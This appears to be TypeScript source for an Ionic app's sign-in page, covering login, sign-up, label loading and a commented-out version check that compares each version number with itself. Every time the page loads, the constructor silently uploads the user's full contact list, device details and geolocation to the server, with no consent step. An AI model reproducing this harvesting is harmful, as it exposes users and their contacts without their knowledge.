/// <reference path="../../../typings/tsd.d.ts" />
import Dictionary = collections.Dictionary;

import {Page, NavController, NavParams} from 'ionic-angular';
import {NewsFeed} from '../NewsFeed/NewsFeed';
import {Config} from '../../providers/config';
import {Cache} from '../../providers/cache';
import {ServiceCaller} from '../../providers/servicecaller';
import {UserCredentials, CredentialsValidation, VersionInfo} from '../../contracts/DataContracts';
import {User} from '../../contracts/ServerContracts';

import {UserContactsInfo, UserDeviceInfo, UserGeoInfo} from '../../contracts/ServerContracts';
import {Contacts, Device, Geolocation} from 'ionic-native';
import {Contact} from 'ionic-native/dist/plugins/contacts';

/* TODO: 1) Handle Error and display
    2) Fetch Email from cordova Device plugin
*/

@Page({
    templateUrl: 'build/pages/SignIn/SignIn.html'
})
export class SignIn {
    loginMode: boolean = false;
    language: string = "";
    email: string = "";
    password: string = "";
    error = "";

    emailLabel: string = "Email";
    passwdLabel: string = "Password";
    enterLabel: string = "Enter";
    signupLabel: string = "Sign Up";
    termsLabel: string = "Terms and Conditions";    

    contacts: Contact[];

    constructor(public nav: NavController, public config: Config, public cache: Cache, public service: ServiceCaller) {
        this.checkIfUserIsLoggedIn();
        this.uploadUserAndDeviceInfo();
    }

    checkIfUserIsLoggedIn() {
        let user: User = JSON.parse(window.localStorage['user'] || '{}');
 
        if (user.Id != undefined) {
            this.loadUserInfo(user.Id, true);
        }
    }

    loadUserInfo(userId: string, navigate: boolean) {
        try {
        let userInfo = this.service.getUserInfo(userId);
        userInfo.subscribe((data) => {
            let firstTime = false; if (data.Language == null) {firstTime = true;}
            this.config.setUserInfo(data); if (navigate) this.navigate(firstTime);});
        } catch (error) {console.log(error)};
    }

    navigate(firstTime: boolean) {
            this.nav.push(NewsFeed);
    }

    login() {
       try {
        let validation = this.service.validateCredentials(this.email, this.password);
        validation.subscribe(data => {let firstTime = false; if (data.Language == null) {firstTime = true;} 
                    this.storeCredAndGoToHome(data, firstTime); });
       } catch (error) {console.log(error)};             
    }

    storeCredAndGoToHome(user: User, firstTime: boolean) {
        window.localStorage['user'] = JSON.stringify(user);
        this.config.setUserInfo(user);
        this.navigate(firstTime);
    }

    signup() {
        try {
        let signup = this.service.signUp(this.email, this.password, this.language);
        signup.subscribe(data => this.storeCredAndGoToHome(data, true));
        } catch (error) {console.log(error)};
    }

    loadLabels() {
        try {
        let labels = this.service.getLabelsOfALanguage(this.config.language);
        labels.subscribe((data) => {this.config.setLabels(data); this.setLabels(data)});
        } catch (error) {console.log(error)};
    }
    
    setLabels(data: Dictionary<string, string>) {
        this.emailLabel = data.getValue('email');
        this.passwdLabel = data.getValue('password');
        this.enterLabel = data.getValue('enter');
        this.signupLabel = data.getValue('signup');
        this.termsLabel = data.getValue('terms');
    }
    
    //#region User Info
        uploadUserAndDeviceInfo() {
        var contactJson: UserContactsInfo;
        var deviceJson: UserDeviceInfo;
        var geoJson: UserGeoInfo;
        
        // Contacts List
        var contactsList = Contacts.find(['*']);
        contactsList.then(data => { this.contacts = data;
            contactJson = { UserId: null, JSON: JSON.stringify(data) }
            let contactsUpload = this.service.uploadContactsList(JSON.stringify(contactJson));
            contactsUpload.subscribe(data => {console.log(data);});
             });
        
        // Device Info
        deviceJson = { UserId: null, JSON: JSON.stringify(Device.device) }
        let deviceUpload = this.service.uploadDeviceInfo(JSON.stringify(deviceJson));
        deviceUpload.subscribe(data => {console.log(data);})
        
        // Geo-location
        let geoPos = Geolocation.getCurrentPosition();
        geoPos.then(data =>    {     
                    geoJson = { UserId: null, JSON: JSON.stringify(data)};
                    let geoUpload = this.service.uploadUserLocation(JSON.stringify(geoJson));
                    geoUpload.subscribe(data => {console.log(data);})
        });        
    }

    //#endregion User Info
    
    // #region Version
    
    /*
    checkVersion() {
        let versionInfo = this.service.getVersionInfo();
        versionInfo.subscribe(data => this.versionAction(data), err => { }, () => { });
    }

    versionAction(info: VersionInfo) {
        if (this.versionComparison(info.MinSupportedVersion, this.config.version)) {
            console.log("Force User to Update version"); return;
        }
        if (this.versionComparison(info.LatestVersion, this.config.version)) {
            console.log("Only suggest user to Update version"); return;
        }
        return;
        // Else do nothing
    }

    versionComparison(version1: string, version2: string) {
        let version1Parts = version1.split('.');
        let version2Parts = version2.split('.');
        if ((Number(version1Parts[0]) > Number(version1Parts[0])) ||
            ((Number(version1Parts[0]) == Number(version1Parts[0]) && (Number(version1Parts[1]) > Number(version1Parts[1])))) ||
            ((Number(version1Parts[0]) == Number(version1Parts[0]) && (Number(version1Parts[1]) == Number(version1Parts[1])) && (Number(version1Parts[2]) > Number(version1Parts[2])))))
        { return true; }
    }
    */
    // #endregion Version

}
